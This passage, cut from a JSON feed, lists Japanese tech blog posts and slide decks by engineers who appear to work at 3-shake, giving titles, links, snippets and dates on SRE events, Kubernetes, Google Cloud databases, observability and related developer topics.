Kobuchi","authorId":"kobuchi"},{"title":"高度情報の午前Ⅱ試験を解くならこのサイト","link":"https://shu-kob.hateblo.jp/entry/2024/08/24/225803","contentSnippet":"もうすぐ9月。秋の情報処理技術者試験も近づいてますね。私はプロジェクトマネージャ試験を受けるので頑張らねば。応用情報午前試験の過去問アプリはたくさんあるのですが、高度情報はないですよね。IPA公式の過去問をPDFで開かずとも、スマホで気軽に過去問演習したいところ。そこで、高度情報の午前Ⅱ試験を解くならこのサイトをご紹介したいと思います。情報処理技術者試験の勉強(過去問題)をやり直し過去問を1問1答形式で時進められます。全ての高度情報に対応しています。こちらを活用して、午前Ⅱは余裕で通過できるようにしておきましょう１","isoDate":"2024-08-24T13:58:03.000Z","dateMiliSeconds":1724507883000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"3-shake SRE Tech Talk #10無事終了。英語は大事w","link":"https://shu-kob.hateblo.jp/entry/2024/08/23/231736","contentSnippet":"3-shake.connpass.comshu-kob.hateblo.jp初のオンサイト開催となる3-shake SRE Tech Talk #10無事終了しました。詳しいことは後日書くとして、私は誘導係をしました。会場となったGoogleさんの渋谷オフィスは渋谷ストリームという新しい建物にあるのですが、エントランスの長いエスカレータの下で誘導していたら外国人2組に道を聞かれました（笑）スリーシェイクTシャツ着て立っていたから、建物の係りの人と思われた？1人目の方には、スマホを見せられ、渋谷ストリーム内の串カツ屋の場所を聞かれました。飲食店マップがあったので、3Fか4Fにあるみたい、と拙い英語で説明w2組目の二人には、スマホを見せられ、半蔵門線渋谷駅の場所を聞かれました。エスカレータを指差し、「（エスカレータを）Down, Purple is Line Color.（半蔵門線のラインカラーは紫）」とまた拙い英語で説明したら、「ありがと！（Arigato）」とお礼を言われました。面白い経験をするとともに、Googleの音声翻訳など便利なものを使えばよかったと思いました。今後はもうちょっとまともな英語を答えられるよう頑張るぞ！","isoDate":"2024-08-23T14:17:36.000Z","dateMiliSeconds":1724422656000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"2024年8月23日(金)は渋谷とオンラインにて3-shake SRE Tech Talk #10","link":"https://shu-kob.hateblo.jp/entry/2024/08/22/214001","contentSnippet":"shu-kob.hateblo.jp以前も書きましたが、2024年8月23日(金)は渋谷とオンラインにて3-shake SRE Tech Talk #10 です。初のオンサイト開催！（オンラインも併用）18:30からGoogle Cloudさんの渋谷オフィスで行います。無料の懇親会もあります。オンサイトは定員40人のところ、前日の8月22日21:36現在、37人と、3人の空きがあります。タイムテーブルはこちら株式会社Topotal 菱田 健太氏「SRE NEXT 2024 で形にしたバトンを渡せる仕組み」株式会社スリーシェイク 阿部貴晶「LLMのO11yに触れる」グーグルクラウドジャパン合同会社 中谷 祐輔氏「スポンサーセッション」弊社スリーシェイクからは「LLMのO11yに触れる」というテーマで、生成AIのオブザーバビリティの話があります。私も会場誘導係として、参加予定です。生成AIに興味ある方もぜひご参加ください。","isoDate":"2024-08-22T12:40:01.000Z","dateMiliSeconds":1724330401000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Cloud Run 上の Next.js を OpenTelemetry で計装する","link":"https://zenn.dev/kimitsu/articles/nextjs-otel-on-cloud-run","contentSnippet":"Cloud Run はコンテナ化されたアプリケーションを実行するための Google Cloud のフルマネージドサービスです。Google Cloud 上でコンテナアプリを動かす場合、Cloud Run がファーストチョイスとなります。Next.js のデプロイ先としては Vercel が有名ですが、Google Cloud 上で動かしたい場合は Cloud Run になるでしょう。Next.js には Experimental ではありますが OpenTelemetry サポートがあり、Vercel でも Pro 以上のプランにすることでテレメトリを収集することができます。今...","isoDate":"2024-08-17T14:41:05.000Z","dateMiliSeconds":1723905665000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"SRE支援の効果的なアプローチについて(SRE NEXT 2024登壇のRecap)","link":"https://zenn.dev/kojake_300/articles/b977011a04fce4","contentSnippet":"この記事は、SRE NEXT 2024で、株式会社スリーシェイクのスポンサーセッションとして登壇した「内製化を見据えた効果的なSRE支援のアプローチ」をセルフでRecapしたものになります。 はじめに株式会社スリーシェイクのSreake事業部に所属しています。2024年8月3日、4日に開催された SRE NEXT 2024 に「内製化を見据えた効果的なSRE支援のアプローチ」という題で登壇しました。20分の枠なのに60枚弱のスライドを作成するという暴挙に出てしまい、端折りながらの説明となってしまったため、Recapとして登壇内容を解説します。 想定読者本登壇資料は、SRE...","isoDate":"2024-08-08T09:18:01.000Z","dateMiliSeconds":1723108681000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"【SRE-NEXT 2024】内製化を見据えた効果的なSRE支援のアプローチ / SRE support approach","link":"https://speakerdeck.com/kojake_300/sre-next-2024-nei-zhi-hua-wojian-ju-etaxiao-guo-de-nasrezhi-yuan-noapuroti","contentSnippet":"","isoDate":"2024-08-03T04:00:00.000Z","dateMiliSeconds":1722657600000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"Node.jsバージョン管理 n コマンドについて","link":"https://www.rowicy.com/blog/n-command/","contentSnippet":"Node.jsを簡単に管理できるツールnコマンドを紹介します。","isoDate":"2024-07-30T00:00:00.000Z","dateMiliSeconds":1722297600000,"authorName":"riiim","authorId":"riiim"},{"title":"Burp Suite Extension を作ってみました","link":"https://www.rowicy.com/blog/burpex-burpee/","contentSnippet":"今回は個人的に開発したBurp Suite拡張機能と、開発してみての体験談を紹介します。","isoDate":"2024-07-28T00:00:00.000Z","dateMiliSeconds":1722124800000,"authorName":"riiim","authorId":"riiim"},{"title":"Raspberry Pi 4 での USB Strage Driver","link":"https://blog.1q77.com/2024/07/raspberry-pi4-usb-strage-driver/","contentSnippet":"ラズパイが時々ハングアップするおうちの Raspberry Pi4 は USB で SSD Driver を接続して Samba で File Server にしているわけですが多くの Read/Write を行うとなぜか OS ごと Hangup するという問題がありました。最初は電源不足かなと思って電源を交換したりもしたのですが改善しませんでした。電源は TP-Link の HS105 経由にしているのでハングアップしたらリモートで電源 Off / On して復旧させていたわけですが不便なのでググって別の解決策を探してみたところそれらしいものがあったのでメモ。(HS105 は生産も終了しており、後継は Tapo P110M のようです)","isoDate":"2024-07-20T10:19:30.000Z","dateMiliSeconds":1721470770000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"モダンインフラの基礎を学ぼう！実践コンテナ入門","link":"https://speakerdeck.com/bells17/motaninhuranoji-chu-woxue-hou-shi-jian-kontenaru-men","contentSnippet":"技育CAMPアカデミアでの発表資料です\\rhttps://talent.supporterz.jp/events/8cb9a300-506c-4d9d-b2af-e9924e0209a2/","isoDate":"2024-07-17T04:00:00.000Z","dateMiliSeconds":1721188800000,"authorName":"bells17","authorId":"bells17"},{"title":"Grafana Beylaの出来るコト出来ないコト","link":"https://zenn.dev/kojake_300/articles/4238a66124d095","contentSnippet":"この記事は、2024/6/28に登壇したJagu\'e\'r Jagu\'e\'r O11y-SRE \xd7 CloudNative コラボ Meetupのリマスターになります。 分散トレーシングの悩み突然ですが皆さん、分散トレーシングを実装する際、一度はこんなことを考えた経験はありませんか？特にクラウドインフラ出身の私は、意気揚々と分散トレーシングを実装しようとした時に、アプリケーションコードが書けずに全く歯が立たなかった苦い経験があります。。。でも、、ということで、本記事ではBeylaとは何者なのか、従来の分散トレーシングとは何が違うのかを解説していきます！\uD83D\uDCAA 分散トレーシ...","isoDate":"2024-07-15T15:07:47.000Z","dateMiliSeconds":1721056067000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"「Efficient Linux コマンドライン」から学んだこと","link":"https://zenn.dev/moz_sec/articles/2a849651de3fe1","contentSnippet":"はじめに本記事では、「Efficient Linux コマンドライン」を読んで、私自身が新たに学んだことについてメモしています。私がすでに知っていた情報については本記事に書いていないため、興味があればお手元に買って読んでみてください。この記事には書いていないこともたくさん書いてあります。この本の対象読者としては、Linuxの勉強を1からしたい人というよりは、Linuxをそこそこ触ったことがある人になると思います。\\"そこそこ触ったことがある\\"のレベルとしては、コマンドでディレクトリを変更したり、プログラムを実行したりしていれば十分です。336ページとそこまで長くもなく、またLi...","isoDate":"2024-07-15T08:51:51.000Z","dateMiliSeconds":1721033511000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"Lookerでもpivotがしたい!!","link":"https://zenn.dev/nedoko_dok0dko/articles/8c70b7bfa0cef4","contentSnippet":"whatLooker上でpivotテーブルができるかを調べてやってみたメモ Q． Lookerでpivotできるの…？A.できるhttps://www.cloudskillsboost.google/course_templates/323/video/432948?locale=jaLooker自身の仕様上、ExcelやLooker Studioのような操作感と少し違う点に注意。 対応グラフ表グラフ表グラフ(レガシー) やってみるExplorerを利用してできるので、簡単なデータを入れたテーブルを用意してやってみる。 利用環境データソース:...","isoDate":"2024-07-02T14:05:01.000Z","dateMiliSeconds":1719929101000,"authorName":"seno","authorId":"seno"},{"title":"eBPFで計装はノーコードの時代へ Grafana Beylaの出来るコト出来ないコト","link":"https://speakerdeck.com/kojake_300/ebpfdeji-zhuang-hanokodonoshi-dai-he-grafana-beylanochu-lai-rukotochu-lai-naikoto","contentSnippet":"","isoDate":"2024-07-01T04:00:00.000Z","dateMiliSeconds":1719806400000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"【Kubernetes☸️】\\"Findy 開発生産性 Conference\\" に登壇","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2024/07/01/120000","contentSnippet":"発表スライドから得られる知識イベント名登壇映像文字起こし謝辞発表スライドから得られる知識発表スライドを見ると、以下を \\"完全に理解\\" できます✌️プラットフォーム設計導入のために、横断的コミュニケーションが必要であるプラットフォームエンジニアリングで、マルチプロダクトの生産性を支えるプラットフォームエンジニアリングで、各マイクロサービスの生産性を支えるみんな！スライドぜってぇ見てくれよな！イベント名オッス！オラ長谷川！✋\uD83C\uDFFB『マルチプロダクトの組織でマイクロサービスアーキテクチャを支えるCICDプラットフォーム設計』ていうテーマで、 Findy 開発生産性 Conference に登壇したぞ！『Findy開発生産性Conference』の発表資料です✊\uD83C\uDFFBオラたちのプラットフォームエンジニアリング事例を紹介してっから、ぜってぇ見てくれよな！✋\uD83C\uDFFB#開発生産性con_findyhttps://t.co/DjqztPn9z4— 長谷川 広樹 (地下強制労働者) (@Hiroki__IT) June 28, 2024 ちな、発表内容はこの記事にも関連してるぜ！登壇映像Findyさんが登壇の映像を公開してくれました\uD83C\uDFA5文字起こしFindyさんが発表を文字起こししてくれました\uD83D\uDDE3️謝辞感謝するぜ！イベントで出会えた全ての方々に！！！\uD83E\uDEF6\uD83C\uDFFB株式会社スリーシェイクのブースにお邪魔させていただきました\uD83D\uDE4C#3shake_inc pic.twitter.com/W7ufgaKfbS— すてにゃん (@stefafafan) June 29, 2024","isoDate":"2024-07-01T03:00:00.000Z","dateMiliSeconds":1719802800000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"♾️ マルチプロダクトの巨大組織でマイクロサービス開発を支えるCICDプラットフォーム設計","link":"https://speakerdeck.com/hiroki_hasegawa/marutipurodakutonozu-zhi-demaikurosabisuakitekutiyawozhi-erucicdpuratutohuomushe-ji","contentSnippet":"\\"Findy開発生産性Conference\\" の発表資料です✊\uD83C\uDFFB\\r\\r生産性を支えるためのプラットフォームエンジニアリング事例として、以下の３つの取り組みを紹介しました！\\r\\r・プラットフォーム設計導入のために、横断的コミュニケーションが必要である\\r・プラットフォームエンジニアリングで、マルチプロダクトの生産性を支える\\r・プラットフォームエンジニアリングで、各マイクロサービスの生産性を支える\\r\\r❓ はてなぶろぐ記事：https://hiroki-hasegawa.hatenablog.jp/entry/2024/07/01/120000\\r\\r\uD83D\uDC26 ツイート：https://x.com/Hiroki__IT/status/1806559579180011572\\r\\r✍\uD83C\uDFFB 社内レポート：https://note.3-shake.com/n/n8efac1be167d\\r\\r\uD83D\uDDE3️ 発表文字起こし：https://findy-code.io/engineer-lab/dev-productivity-con-2024-3shake\\r\\r\uD83D\uDCFA 動画：https://www.youtube.com/watch?v=88wTolxNjDk&t=1240s","isoDate":"2024-06-28T04:00:00.000Z","dateMiliSeconds":1719547200000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"おまえらのFizzBuzzは間違っている(Go オブジェクト指向)","link":"https://zenn.dev/kamos/articles/ce9ff83b90abbc","contentSnippet":"はじめに釣りタイトルですまん。この記事は社内勉強会向けに作成した内容をZenn向けに再編集したものです。ソースコードhttps://github.com/Mkamono/objective-fizz-buzz 種本「ちょうぜつソフトウェア設計入門 PHPで理解するオブジェクト指向の活用」の5-3を参考にしました。https://amzn.asia/d/ewM0dJ1 突然ですが、FizzBuzzを書いてみてくださいはい。頑張ってください。要求は以下のとおりです。1以上の整数値が入力として渡される3の倍数のときは\\"Fizz\\"と出力する5の倍数のときは\\"B...","isoDate":"2024-06-25T14:10:37.000Z","dateMiliSeconds":1719324637000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"あまり知られていないLaravelのコレクションメソッド #2: concat","link":"https://qiita.com/aminevg/items/8c3fbd6c7381836a4055","contentSnippet":"目次あまり知られていないLaravelのコレクションメソッド #1: macroあまり知られていないLaravelのコレクションメソッド #2: concat （本記事）背景Laravelのコレクション、使いこなしていますか？以下の記事を先程読んで面白いと...","isoDate":"2024-06-19T11:18:31.000Z","dateMiliSeconds":1718795911000,"authorName":"Amine Ilidrissi","authorId":"amine"},{"title":"Taskfileを有効活用して、Makefileのシェル芸から逃げる","link":"https://zenn.dev/kamos/articles/fc94a7e73a9ad5","contentSnippet":"はじめに皆さん、Makefileは使っていらっしゃるでしょうか？Makefileは、ソフトウェアのビルドプロセスを自動化するための設定ファイルです。主にUNIX系OSで使用され、プログラムのコンパイル、リンク、インストールなどの手順を記述することで、簡単に実行できます。今回はBetter MakefileとしてTaskfileを紹介したいと思います。!Makefileはmakeコマンドによって実行されるファイルのことを指します。この記事では簡単のため、makeコマンドとMakefileを区別せず、ほぼすべての部分でMakefileと記載します。Taskfileもtaskコ...","isoDate":"2024-06-15T07:41:22.000Z","dateMiliSeconds":1718437282000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"Test Suiteってなに？","link":"https://qiita.com/m_pig/items/b2687df1da94edcaba89","contentSnippet":"記事を書くきっかけGoで自動テストを作成する際にstretchr/testifyを使用しているのですが、suiteをよく使います。最初はライブラリ特有のものと思いsuiteについて調べていたのですが、Test suiteという言葉があったことに驚きこの記事を書こうと思い...","isoDate":"2024-06-14T09:45:58.000Z","dateMiliSeconds":1718358358000,"authorName":"Yushin Matsuura","authorId":"matsuura"},{"title":"API設計時に役立つAPIリファレンス一覧","link":"https://qiita.com/m_pig/items/a87248bcb0d783bd386b","contentSnippet":"この記事についてGolangでAPIを開発している際に参考にしたAPI referenceを自分のメモがてら書いていきます。google APIsgoogleのドキュメントでは画面右側から API exploreを使用して簡単にAPIを叩くことができるので実際のデ...","isoDate":"2024-06-10T00:56:48.000Z","dateMiliSeconds":1717981008000,"authorName":"Yushin Matsuura","authorId":"matsuura"},{"title":"Google Cloud主催パートナー向けイベントで「Google Cloud で利用できるRDBのベクトル検索を徹底解剖！」を話しました。","link":"https://zenn.dev/nnaka2992/articles/compare_vector_searches_on_google_clouds_rdb","contentSnippet":"2024年6月5日にGoogle Cloudがパートナー向けに開催したデータ関連の非公開イベントで「Google Cloud で利用できるRDBのベクトル検索を徹底解剖！」というLTを話しました。https://speakerdeck.com/nnaka2992/google-cloud-deli-yong-dekirurdbnobekutorujian-suo-woche-di-jie-pou非公開イベントのため録画がなかったり、LT枠だった関係で省略してしまった部分があったりしたためブログでより詳細な説明資料のようなものを書きました。 背景Google Cloudが提供する...","isoDate":"2024-06-09T22:00:00.000Z","dateMiliSeconds":1717970400000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Cloud SQL for PostgreSQLのベクトル検索を試す","link":"https://zenn.dev/nnaka2992/articles/play_with_cloud_sql_vector_search","contentSnippet":"Google Cloud Next \'24でGoogle Cloudが提供するすべてのマネージドデータベースにベクトル検索の機能が追加されました。[1]今回はそのなかのCloud SQL for PostgreSQLにフォーカスしてベクトル検索機能を試します。 Cloud SQL for PostgreSQL インスタンススペックエディションEnterprisevCPU2RAM8GBストレージタイプSSDZoneasia-northeast1接続パブリックIPを有効化 必要な設定を行うデータベースを作成す...","isoDate":"2024-05-26T15:54:14.000Z","dateMiliSeconds":1716738854000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"セキュリティ人材になるために/becoming a security personnel","link":"https://speakerdeck.com/moz_sec_/becoming-a-security-personnel","contentSnippet":"2024年5月23日に行われたランチタイムトークで登壇した資料です。","isoDate":"2024-05-23T04:00:00.000Z","dateMiliSeconds":1716436800000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"Kubernetes Code Contribution入門","link":"https://speakerdeck.com/bells17/kubernetes-code-contributionru-men","contentSnippet":"Kubernetes Novice Tokyo #32 で登壇したセッションの資料です。\\rhttps://k8s-novice-jp.connpass.com/event/317561/\\r\\r配信URL:\\rhttps://www.youtube.com/live/sRLG9ufaZ4M","isoDate":"2024-05-21T04:00:00.000Z","dateMiliSeconds":1716264000000,"authorName":"bells17","authorId":"bells17"},{"title":"サイバーセキュリティの最新動向：脅威と対策","link":"https://speakerdeck.com/kyohmizu/saibasekiyuriteinozui-xin-dong-xiang-xie-wei-todui-ce","contentSnippet":"セミナー登壇資料です。2024/05/21\\rhttps://pages.securify.jp/event-seminar-20240521.html","isoDate":"2024-05-21T04:00:00.000Z","dateMiliSeconds":1716264000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Oracle Dataabse 19cの検証環境が欲しいからProxmoxに環境構築する","link":"https://zenn.dev/nnaka2992/articles/install_oracle_19c_to_proxmox","contentSnippet":"概要300年ぶりぐらいに、ローカル環境(非Cloud環境)でホストしたOracle Databaseが欲くなったので、自宅にあるProxmoxへインストールします。 前提Proxmoxにダウンロード済みのOracle Linux 9のイメージを利用する。利用するOracle Databaseは19cとする。検証環境のため本番用途に適した設定ではない。 Proxmox VMを建ち上げる Oracle Database 19cのサーバ要件今回関係あるもののみ抜粋しています。OSOracle Linux 9およびRed Hat互換カーネル: 5.14.0-...","isoDate":"2024-05-19T14:18:18.000Z","dateMiliSeconds":1716128298000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"CloudSQL for PostgreSQLのベンチマークと比較して理解するAlloyDBの特徴","link":"https://zenn.dev/nnaka2992/articles/compare_alloydb_and_postgres","contentSnippet":"概要Google Cloudが提供するPostgreSQL互換データベースであるAlloyDBのパフォーマンスをトランザクション用途・分析用途の双方から検証する。今回の検証ではAlloyDBの上限を見定めるのではなく、CloudSQLと比べてどのようなパフォーマンスになるを目的とする。 TL;DR絞り込み条件がインデックスに限定されない場合、AlloyDBのパフォーマンスメリットが特に大きくなる。絞り込み条件がインデックスに限定され、かつデータサイズが小さい場合、CloudSQL for PostgreSQLのコストパフォーマンスが大きくなる。現将・将来のワークロード...","isoDate":"2024-05-17T15:16:13.000Z","dateMiliSeconds":1715958973000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"[Kubernetes 1.30] kube-proxy の nftables モード","link":"https://zenn.dev/toversus/articles/dcb888d73f0615","contentSnippet":"kube-proxyService へのトラフィックをプロキシするコンポーネントのデフォルト実装e.g.) Cluster IP への通信を Pod IP にリダイレクトするEndpointSlice, Service, Node などのオブジェクトの変更を検知して Service を介したトラフィックのルーティングを可能にするContainer Network Interface (CNI) vs kube-proxyCNI が Pod 間で通信できるように Pod IP の払い出しやルーティングをセットアップするPod は一時的なものかつ Pod ...","isoDate":"2024-05-16T23:43:33.000Z","dateMiliSeconds":1715903013000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"Dev ContainersとTestcontainers","link":"https://speakerdeck.com/bells17/devcontainerstotestcontainers","contentSnippet":"TechFeed Experts Night#28 〜 コンテナ技術最前線 〜で登壇したセッションの資料です。\\rhttps://techfeed.io/events/techfeed-experts-night-28","isoDate":"2024-05-08T04:00:00.000Z","dateMiliSeconds":1715140800000,"authorName":"bells17","authorId":"bells17"},{"title":"[Kubernetes 1.30] Dynamic Resource Allocation の再構築","link":"https://zenn.dev/toversus/articles/5bbd68e507f28d","contentSnippet":"!Kubernetes 1.30 時点でアルファ機能のため、実装が大きく変わる可能性があります。[Kubernetes 1.27] Dynamic Resource Allocation のいまで紹介した Dynamic Resource Allocation (DRA) の内部的な仕組みに Kubernetes 1.30 で大きく変更が入ることになりました。内部的な仕組みの変更なので、ユーザー視点ではこれまでと利用方法は変わりません。ResourceClass に追加されたフィールドを有効にしないと新しい仕組みが使えないため、クラスタ管理者は対応が必要になります。世界的に AI...","isoDate":"2024-04-30T06:43:41.000Z","dateMiliSeconds":1714459421000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"WireGuard Exporter と Grafana Alloy で VPN 通信量を可視化","link":"https://blog.1q77.com/2024/04/wireguard-exporter/","contentSnippet":"先日、家のラズパイに Grafana Alloy をセットアップしてメトリクス可視化の環境はできているので WireGuard での VPN 通信のメトリクスを可視化してみようかなと試してみました。","isoDate":"2024-04-28T12:57:31.000Z","dateMiliSeconds":1714309051000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"見て見ぬふりをしない、権限とWorkload Identity(Google Cloud)","link":"https://zenn.dev/kamos/articles/92a8125dc3adac","contentSnippet":"はじめにGoogle Cloudを使う際、最も頻繁に遭遇するエラーは「権限が足りない」というものでした。特に新しいプロジェクトを立ち上げ、CI/CDの構築に取り組む際にこのエラーに何度も直面し、時間を浪費してしまいました。この経験から、Google Cloudの権限管理を深く知ることが重要であると痛感しました。そこで、体系的にGoogle Cloudの権限管理を学び、その成果をこの記事でわかりやすく共有したいと思います。 この記事を読んでほしい人Google Cloudにおける権限、ロール、プリンシパル、ポリシーの意味と関係性を説明できない人Workload Ident...","isoDate":"2024-04-27T16:53:02.000Z","dateMiliSeconds":1714236782000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"Dev Containerを使ってみよう","link":"https://zenn.dev/bells17/articles/devcontainer-2024","contentSnippet":"Dev Containerを使ってみようDev Containerを使う上で知っておくと良さげな情報のまとめ記事です前にRemote SSHでDev Containerの環境を構築する記事を書いたので、今回はDev Container全般の情報をまとめてみましたhttps://zenn.dev/bells17/articles/remote-ssh-devcontainer tl;drDev Containerを使うと開発環境をコンテナで構築できるよ(ランタイムとかツール類含めて！)docker composeだとアプリケーションを動作させる環境は作れるけどDev C...","isoDate":"2024-04-22T18:05:48.000Z","dateMiliSeconds":1713809148000,"authorName":"bells17","authorId":"bells17"},{"title":"[EKS] Amazon Linux 2023 への移行","link":"https://zenn.dev/toversus/articles/a4bbd2047bbba1","contentSnippet":"2024/2/29 に Amazon Linux 2023 が EKS で正式サポートされました。全てのリージョンの Karpenter Node、マネージドノードグループ、セルフマネージドノードグループで利用可能です。現在 EKS でサポート対象の 1.25 以降に加えて、延長サポートに入っている EKS 1.23 / 1.24 でも利用できます。Amazon Linux 2023 のサポートに関しては Amazon EKS-Optimized Amazon Linux 2023 AMIs Now Available のブログに詳細がまとまっています。 セキュリティ機能の強化Am...","isoDate":"2024-04-17T00:22:38.000Z","dateMiliSeconds":1713313358000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"コンテナセキュリティの基本と脅威への対策","link":"https://speakerdeck.com/kyohmizu/kontenasekiyuriteinoji-ben-toxie-wei-henodui-ce","contentSnippet":"「Offers - 何から始める？脅威から考えるコンテナセキュリティのベストプラクティス」の登壇資料です。2024/04/16\\rhttps://offers.connpass.com/event/314412/","isoDate":"2024-04-16T04:00:00.000Z","dateMiliSeconds":1713240000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Grafana Alloy でメトリクス収集","link":"https://blog.1q77.com/2024/04/grafana-alloy/","contentSnippet":"Raspberry Pi を新しくしてからメトリクスの可視化を行っていなかったので Grafana Cloud で見れるようにセットアップしようと Grafana のサイトを見ていたら Alloy というものの存在を知ったので試してみる。","isoDate":"2024-04-15T15:16:09.000Z","dateMiliSeconds":1713194169000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Vimコマンドの考え方覚え方について","link":"https://qiita.com/m_pig/items/5701ac8e79f610f8e055","contentSnippet":"この記事についてVimを使用して普段開発しているのですが、先輩に勧められたテキストを読んでvimコマンドの考え方が今までと変わったので考え方について書いていきます。その他テキストから知って便利だったプラグインを紹介します。考え方コマンドの実行は主に暗記に頼...","isoDate":"2024-04-04T04:27:31.000Z","dateMiliSeconds":1712204851000,"authorName":"Yushin Matsuura","authorId":"matsuura"},{"title":"PGUnconf #46 でPostgreSQL の開発するときにまず何からすればいいかを聞いてきた","link":"https://nnaka2992.hatenablog.com/entry/zatu/20240323_pgunconf.md","contentSnippet":"PGUnconf #46 でPostgreSQL の開発するときにまず何からすればいいかを聞いてきた概要2024年3月23日に第46回 PostgreSQLアンカンファレンス@東京が開催されました。PostgreSQLアンカンファレンスは日本PostgreSQLユーザー会が主催するイベントでPostgreSQLユーザーはもちろん、PostgreSQLのコントリンビューターやコミッターも参加しているイベントです。その中でPostgreSQL メジャーコントリビューターであり、コミッターでもある@masahiko_sawadaさんが、PGConn 2024でMAKING POSTGRESQL HACKING MORE INCLUSIVEというセッションでPostgreSQLコミュニティーがどうすればより初心者にオープンになれるか？ という内容でディスカッションするそうです。そこに向けてアイデアはあるか？ 困ってることはないか？ という相談？ をされていました。経験豊富な方々は実践的な案を出していましたが、私はPostgreSQLにコードコントリビュートしたいけど何からすればいいのか分らないという状態だったのでこの機会に相談してみました。自分のレベル感Cはすこし読める。すこし書けるPostgreSQLのソースコードはsimple_query_execの関数をひととおり読んで、なんとなくどこで何しているか分かるPostgreSQLのメーリングリストはとりあえず入った何が分からなかったのか？そもそもPostgreSQLはメーリングリストとパッチの文化なのでGitHub/Labなどになれた身からするとよく分からないです。またGitHubで管理されているOSSでは良くあるgood first issueのようなものも存在しないため、新規参入者には難しいと感じていました。なにからすればいいのか？PGUnconfでは以下のようなアドバイスを受けました。チュートリアルをなぞってドキュメント通りに動かないものを修正する初心者向けコンテンツへの追記は初心者にしか出来ないので、是非おねがいしたいとのことでした既存のパッチで放置されているもの(Headでビルドできないようなもの)をアップデートするメーリングリストのディスカッションを眺めてネタを探す新規機能を試してバグをさがし、修正するCommitFestに参加するまとめ1のネタを探してみつつ、PostgreSQL17のリリースが近いので4に取りくんでみようと思います。","isoDate":"2024-03-31T14:30:29.000Z","dateMiliSeconds":1711895429000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"BigQuery の Object テーブルと Gemini-pro-vision リモートモデルを使って pdf を要約してみる","link":"https://zenn.dev/satohjohn/articles/0cc45efca800e3","contentSnippet":"概要pdf などの非構造化データを GCS に配置した際に BQ で分析するってどうすんねんというところをやってみる流れとしては以下を実施するpdf などを gcs に配置するBigQuery Connection の作成する必要な権限付与を行うBQ で Object テーブルを作成するBQ でリモートモデルを作成するObject テーブルを使って pdf の要約をする 必要なことBigQuery Connection API の有効化 手順 pdf などを GCS に配置するここは何も考えないで GCS に pdf を配置する例えば、今回...","isoDate":"2024-03-30T17:44:21.000Z","dateMiliSeconds":1711820661000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"オシャレな図を書くために意識していること","link":"https://speakerdeck.com/kojake_300/osiyarenatu-woshu-kutameniyi-shi-siteirukoto","contentSnippet":"","isoDate":"2024-03-29T04:00:00.000Z","dateMiliSeconds":1711684800000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"2024-03-29 SRETT9 Cloud SQLの可用性について","link":"https://speakerdeck.com/masasuzu/2024-03-29-srett9-cloudsqlnoke-yong-xing","contentSnippet":"","isoDate":"2024-03-29T04:00:00.000Z","dateMiliSeconds":1711684800000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"4か月でSAA-C03に合格した話","link":"https://qiita.com/r4ynode/items/755ba932f2edcccaabaa","contentSnippet":"2024年4月1日から試験料金が値上げされますね。値上げ話から昨年受験したことを思い出したので感想を書いていこうと思います。はじめに2023年9月2日 SAA-C03に合格しました。資格勉強する以前は、クラウド聞いたことはあるけど何それ美味しいの？？状態でし...","isoDate":"2024-03-27T09:17:59.000Z","dateMiliSeconds":1711531079000,"authorName":"Reito Koike","authorId":"reito"},{"title":"ECSのタグ付け認可とアカウント単位のオプトアウトの廃止","link":"https://blog.masasuzu.net/entry/2024/03/20/121151","contentSnippet":"ECSのタグ付け認可とはアカウント単位のオプトアウトの廃止確認影響がある例対応まとめ関連リソースECSのタグ付け認可とはECS関連のリソース作成時にリソースタグを付けることができます。その際 ecs:tagResource の権限が必要となります。なお、リソースタグを設定しないECSリソース作成の際は権限不要です。この権限の有無のチェックをタグ付け認可と言います。具体的にECSリソースの作成のアクションは以下の通りです。CreateCapacityProviderCreateClusterCreateServiceCreateTaskSetRegisterContainerInstanceRegisterTaskDefinitionRunTaskStartTaskタグ付け認可の仕組みは2023年4月18日に導入されました。しかしながら従来からECSリソースを作成する際にタグ付けしていたAWSアカウントに関しては影響があるため、アカウントレベルでタグ付け認可の機能を無効(オプトアウト)することができました。つまりアカウントレベルで無効にしていれば ecs:tagResource の権限がなくてもタグ付けをすることが可能でした。しかしながらアカウント単位のオプトアウト設定は2024年3月9日に廃止されます。アカウント単位のオプトアウトの廃止タグ付け認可におけるタイムラインは以下のとおりです2023年4月18日 タグ付け認可の導入とアカウント単位での有効化設定の導入2024年2月9日- 2月28日 新規アカウントおよび影響を受けないアカウントに関してデフォルトでタグ付け認可の有効化が行われる2024年2月29日 アカウント単位で有効にしている場合、無効に変更できなくなる2024年3月29日 